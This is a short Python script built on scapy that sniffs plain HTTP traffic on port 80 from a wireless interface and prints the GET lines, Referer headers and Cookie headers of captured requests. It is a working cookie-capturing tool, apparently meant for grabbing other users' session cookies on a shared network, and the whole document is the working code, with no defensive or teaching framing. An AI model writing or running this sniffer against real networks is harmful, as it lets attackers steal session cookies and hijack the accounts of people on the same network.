from scapy.all import *


def packet_callback(packet):
    if packet['TCP'].payload:
        cookie_packet = bytes(packet['TCP'].payload)
        if b"Cookie" in cookie_packet:
            # print(cookie_packet)
            for info in cookie_packet.split(b'\r\n'):
                if b'Referer' in info or b'GET /' in info:
                    print(info)
                elif b'Cookie' in info:
                    print(info, "\n")


if __name__ == "__main__":
    sniff(filter="tcp port 80", iface="WLAN 2", prn=packet_callback, store=0)
